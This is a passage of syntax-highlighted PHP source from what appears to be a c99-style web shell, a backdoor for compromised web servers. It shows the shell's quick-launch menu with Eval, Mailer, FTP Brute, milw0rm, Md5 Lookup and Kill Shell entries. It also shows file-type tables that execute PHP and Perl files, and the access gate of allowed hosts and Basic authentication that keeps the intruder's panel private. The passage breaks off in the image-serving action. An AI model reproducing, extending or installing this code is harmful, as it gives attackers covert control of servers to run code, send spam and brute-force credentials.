    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=back</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Back</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">history.back(1)&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=forward</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Forward</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">history.go(1)&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=up</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Up</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=%upd&amp;sort=%sort&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=search</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Search</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=search&amp;d=%d&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=buffer</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Buffer</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=fsbuff&amp;d=%d&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=help</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">About</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=about&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Security&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=security&amp;d=%d&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Processes&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=processes&amp;d=%d&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;MySQL&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;d=%d&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Eval&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=eval&amp;d=%d&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Encoder&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=encoder&amp;d=%d&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Mailer&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=fxmailer&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Toolz&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=tools&amp;d=%d&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;milw0rm&quot;</span><span class="p">,</span><span class="nx">milw0rm</span><span class="p">()),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Md5 Lookup&quot;</span><span class="p">,</span><span class="s2">&quot;http://darkc0de.com/database/md5lookup.html&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Images&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=listall&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Feedback&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=feedback&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Update&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=update&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Kill Shell&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=selfremove&quot;</span><span class="p">)</span>
<span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span>
<span class="nv">$quicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;br&amp;gt;FTP Brute&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ftpquickbrute&amp;d=%d&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="c1">###[ FILE TYPES ]###</span>
<span class="nv">$ftypes</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="s2">&quot;html&quot;</span>     <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;html&quot;</span><span class="p">,</span><span class="s2">&quot;htm&quot;</span><span class="p">,</span><span class="s2">&quot;shtml&quot;</span><span class="p">),</span>
  <span class="s2">&quot;txt&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;txt&quot;</span><span class="p">,</span><span class="s2">&quot;conf&quot;</span><span class="p">,</span><span class="s2">&quot;bat&quot;</span><span class="p">,</span><span class="s2">&quot;sh&quot;</span><span class="p">,</span><span class="s2">&quot;js&quot;</span><span class="p">,</span><span class="s2">&quot;bak&quot;</span><span class="p">,</span><span class="s2">&quot;doc&quot;</span><span class="p">,</span><span class="s2">&quot;log&quot;</span><span class="p">,</span><span class="s2">&quot;sfc&quot;</span><span class="p">,</span><span class="s2">&quot;cfg&quot;</span><span class="p">,</span><span class="s2">&quot;htaccess&quot;</span><span class="p">),</span>
  <span class="s2">&quot;exe&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;sh&quot;</span><span class="p">,</span><span class="s2">&quot;install&quot;</span><span class="p">,</span><span class="s2">&quot;bat&quot;</span><span class="p">,</span><span class="s2">&quot;cmd&quot;</span><span class="p">,</span><span class="s2">&quot;sys&quot;</span><span class="p">,</span><span class="s2">&quot;com&quot;</span><span class="p">),</span>
  <span class="s2">&quot;ini&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ini&quot;</span><span class="p">,</span><span class="s2">&quot;inf&quot;</span><span class="p">,</span><span class="s2">&quot;conf&quot;</span><span class="p">),</span>
  <span class="s2">&quot;code&quot;</span>     <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;php&quot;</span><span class="p">,</span><span class="s2">&quot;phtml&quot;</span><span class="p">,</span><span class="s2">&quot;php3&quot;</span><span class="p">,</span><span class="s2">&quot;php4&quot;</span><span class="p">,</span><span class="s2">&quot;inc&quot;</span><span class="p">,</span><span class="s2">&quot;tcl&quot;</span><span class="p">,</span><span class="s2">&quot;h&quot;</span><span class="p">,</span><span class="s2">&quot;c&quot;</span><span class="p">,</span><span class="s2">&quot;cpp&quot;</span><span class="p">,</span><span class="s2">&quot;py&quot;</span><span class="p">,</span><span class="s2">&quot;cgi&quot;</span><span class="p">,</span><span class="s2">&quot;pl&quot;</span><span class="p">),</span>
  <span class="s2">&quot;img&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;gif&quot;</span><span class="p">,</span><span class="s2">&quot;png&quot;</span><span class="p">,</span><span class="s2">&quot;jpeg&quot;</span><span class="p">,</span><span class="s2">&quot;jfif&quot;</span><span class="p">,</span><span class="s2">&quot;jpg&quot;</span><span class="p">,</span><span class="s2">&quot;jpe&quot;</span><span class="p">,</span><span class="s2">&quot;bmp&quot;</span><span class="p">,</span><span class="s2">&quot;ico&quot;</span><span class="p">,</span><span class="s2">&quot;tif&quot;</span><span class="p">,</span><span class="s2">&quot;tiff&quot;</span><span class="p">,</span><span class="s2">&quot;avi&quot;</span><span class="p">,</span><span class="s2">&quot;mpg&quot;</span><span class="p">,</span><span class="s2">&quot;mpeg&quot;</span><span class="p">),</span>
  <span class="s2">&quot;sdb&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;sdb&quot;</span><span class="p">),</span>
  <span class="s2">&quot;phpsess&quot;</span>  <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;sess&quot;</span><span class="p">),</span>
  <span class="s2">&quot;download&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;exe&quot;</span><span class="p">,</span><span class="s2">&quot;com&quot;</span><span class="p">,</span><span class="s2">&quot;sys&quot;</span><span class="p">,</span><span class="s2">&quot;pif&quot;</span><span class="p">,</span><span class="s2">&quot;src&quot;</span><span class="p">,</span><span class="s2">&quot;lnk&quot;</span><span class="p">,</span><span class="s2">&quot;zip&quot;</span><span class="p">,</span><span class="s2">&quot;rar&quot;</span><span class="p">,</span><span class="s2">&quot;gz&quot;</span><span class="p">,</span><span class="s2">&quot;tar&quot;</span><span class="p">,</span><span class="s2">&quot;pdf&quot;</span><span class="p">)</span>
<span class="p">);</span>
<span class="nv">$exeftypes</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="s2">&quot;php -q %f%&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;php&quot;</span><span class="p">,</span><span class="s2">&quot;php3&quot;</span><span class="p">,</span><span class="s2">&quot;php4&quot;</span><span class="p">),</span>
  <span class="s2">&quot;perl %f%&quot;</span>   <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pl&quot;</span><span class="p">,</span><span class="s2">&quot;cgi&quot;</span><span class="p">)</span>
<span class="p">);</span>
<span class="nv">$regxp_highlight</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="k">array</span><span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_SELF&quot;</span><span class="p">]),</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#FF6600&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.tgz$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#C082FF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.gz$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#C082FF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.tar$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#C082FF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.bz2$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#C082FF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.zip$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#C082FF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.rar$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#C082FF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.php$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FF00&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.php3$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FF00&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.php4$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FF00&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.jpg$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FFFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.jpeg$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FFFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.JPG$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FFFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.JPEG$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FFFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.ico$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FFFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.gif$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FFFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.png$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00FFFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.htm$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00CCFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.html$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#00CCFF&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.txt$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#C0C0C0&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.pdf$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=#FF99CC&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">)</span>
<span class="p">);</span>
<span class="c1">###[ HIGHLIGHT CODE ]###</span>
<span class="nv">$highlight_bg</span>      <span class="o">=</span> <span class="s2">&quot;#E0E0E0&quot;</span><span class="p">;</span>
<span class="nv">$highlight_comment</span> <span class="o">=</span> <span class="s2">&quot;#FF6600&quot;</span><span class="p">;</span>
<span class="nv">$highlight_default</span> <span class="o">=</span> <span class="s2">&quot;#000080&quot;</span><span class="p">;</span>
<span class="nv">$highlight_html</span>    <span class="o">=</span> <span class="s2">&quot;#1300FF&quot;</span><span class="p">;</span>
<span class="nv">$highlight_keyword</span> <span class="o">=</span> <span class="s2">&quot;#007700&quot;</span><span class="p">;</span>
<span class="nv">$highlight_string</span>  <span class="o">=</span> <span class="s2">&quot;#FF0000&quot;</span><span class="p">;</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.bg&quot;</span><span class="p">,</span><span class="nv">$highlight_bg</span><span class="p">);</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.comment&quot;</span><span class="p">,</span><span class="nv">$highlight_comment</span><span class="p">);</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.default&quot;</span><span class="p">,</span><span class="nv">$highlight_default</span><span class="p">);</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.html&quot;</span><span class="p">,</span><span class="nv">$highlight_html</span><span class="p">);</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.keyword&quot;</span><span class="p">,</span><span class="nv">$highlight_keyword</span><span class="p">);</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.string&quot;</span><span class="p">,</span><span class="nv">$highlight_string</span><span class="p">);</span>
<span class="c1">###########################################</span>
<span class="c1">###[ END OF CONFIGURATIONS ]###</span>
<span class="c1">###########################################</span>
<span class="c1">##############################</span>
<span class="c1">###[ AUTHENTICATE ]###</span>
<span class="c1">##############################</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$auth</span><span class="p">[</span><span class="s2">&quot;hostallow&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$tmp</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">*&quot;</span><span class="p">,</span><span class="s2">&quot;.*&quot;</span><span class="p">,</span><span class="nb">preg_quote</span><span class="p">(</span><span class="nv">$v</span><span class="p">));</span> <span class="p">}</span>
<span class="nv">$s</span> <span class="o">=</span> <span class="s2">&quot;!^(&quot;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)$!i&quot;</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">))</span> <span class="k">and</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span><span class="nb">gethostbyaddr</span><span class="p">(</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">))))</span> <span class="p">{</span>
  <span class="k">exit</span><span class="p">(</span><span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="si">$sh_mainurl\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.sh_name().&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">ACCESS</span> <span class="nx">DENIED</span><span class="o">!</span> <span class="nx">Your</span> <span class="nx">host</span> <span class="p">(</span><span class="s2">&quot;.getenv(&quot;</span><span class="nx">REMOTE_ADDR</span><span class="s2">&quot;).&quot;</span><span class="p">)</span> <span class="k">not</span> <span class="nx">allowed</span><span class="o">!</span><span class="s2">&quot;);</span>
<span class="s2">}</span>
<span class="s2">if (!empty(</span><span class="si">$auth[&quot;login&quot;]</span><span class="s2">)) {</span>
<span class="s2">  if (empty(</span><span class="si">$auth[&quot;md5pass&quot;]</span><span class="s2">)) { </span><span class="si">$auth[&quot;md5pass&quot;]</span><span class="s2"> = md5(</span><span class="si">$auth[&quot;pass&quot;]</span><span class="s2">); }</span>
<span class="s2">  if ((</span><span class="si">$_SERVER[&quot;PHP_AUTH_USER&quot;]</span><span class="s2"> != </span><span class="si">$auth[&quot;login&quot;]</span><span class="s2">) or (md5(</span><span class="si">$_SERVER[&quot;PHP_AUTH_PW&quot;]</span><span class="s2">) != </span><span class="si">$auth[&quot;md5pass&quot;]</span><span class="s2">)) {</span>
<span class="s2">    header(&quot;</span><span class="nx">WWW</span><span class="o">-</span><span class="nx">Authenticate</span><span class="o">:</span> <span class="nx">Basic</span> <span class="nx">realm</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;: Restricted Area</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;HTTP/1.0 401 Unauthorized&quot;</span><span class="p">);</span>
    <span class="k">die</span><span class="p">(</span><span class="nv">$auth</span><span class="p">[</span><span class="s2">&quot;denied&quot;</span><span class="p">]);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="c1">######################</span>
<span class="c1">###[ ACTIONS ]###</span>
<span class="c1">######################</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$act</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;img&quot;</span><span class="p">)</span> <span class="p">{</span>
  <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
  <span class="nv">$images</span> <span class="o">=</span> <span class="nx">imagez</span><span class="p">();</span>
  <span class="nv">$imgequals</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="s2">&quot;ext_tar&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_tar&quot;</span><span class="p">,</span><span class="s2">&quot;ext_r00&quot;</span><span class="p">,</span><span class="s2">&quot;ext_ace&quot;</span><span class="p">,</span><span class="s2">&quot;ext_arj&quot;</span><span class="p">,</span><span class="s2">&quot;ext_bz&quot;</span><span class="p">,</span><span class="s2">&quot;ext_bz2&quot;</span><span class="p">,</span><span class="s2">&quot;ext_tbz&quot;</span><span class="p">,</span><span class="s2">&quot;ext_tbz2&quot;</span><span class="p">,</span><span class="s2">&quot;ext_tgz&quot;</span><span class="p">,</span><span class="s2">&quot;ext_uu&quot;</span><span class="p">,</span><span class="s2">&quot;ext_xxe&quot;</span><span class="p">,</span><span class="s2">&quot;ext_zip&quot;</span><span class="p">,</span><span class="s2">&quot;ext_cab&quot;</span><span class="p">,</span><span class="s2">&quot;ext_gz&quot;</span><span class="p">,</span><span class="s2">&quot;ext_iso&quot;</span><span class="p">,</span><span class="s2">&quot;ext_lha&quot;</span><span class="p">,</span><span class="s2">&quot;ext_lzh&quot;</span><span class="p">,</span><span class="s2">&quot;ext_pbk&quot;</span><span class="p">,</span><span class="s2">&quot;ext_rar&quot;</span><span class="p">,</span><span class="s2">&quot;ext_uuf&quot;</span><span class="p">),</span>
    <span class="s2">&quot;ext_php&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_php&quot;</span><span class="p">,</span><span class="s2">&quot;ext_php3&quot;</span><span class="p">,</span><span class="s2">&quot;ext_php4&quot;</span><span class="p">,</span><span class="s2">&quot;ext_php5&quot;</span><span class="p">,</span><span class="s2">&quot;ext_phtml&quot;</span><span class="p">,</span><span class="s2">&quot;ext_shtml&quot;</span><span class="p">,</span><span class="s2">&quot;ext_htm&quot;</span><span class="p">),</span>
    <span class="s2">&quot;ext_cpp&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_c&quot;</span><span class="p">),</span>
    <span class="s2">&quot;ext_jpg&quot;</span>      <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_jpg&quot;</span><span class="p">,</span><span class="s2">&quot;ext_gif&quot;</span><span class="p">,</span><span class="s2">&quot;ext_png&quot;</span><span class="p">,</span><span class="s2">&quot;ext_jpeg&quot;</span><span class="p">,</span><span class="s2">&quot;ext_jfif&quot;</span><span class="p">,</span><span class="s2">&quot;ext_jpe&quot;</span><span class="p">,</span><span class="s2">&quot;ext_bmp&quot;</span><span class="p">,</span><span class="s2">&quot;ext_ico&quot;</span><span class="p">,</span><span class="s2">&quot;ext_tif&quot;</span><span class="p">,</span><span class="s2">&quot;tiff&quot;</span><span class="p">),</span>
    <span class="s2">&quot;ext_html&quot;</span>     <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_html&quot;</span><span class="p">,</span><span class="s2">&quot;ext_htm&quot;</span><span class="p">),</span>
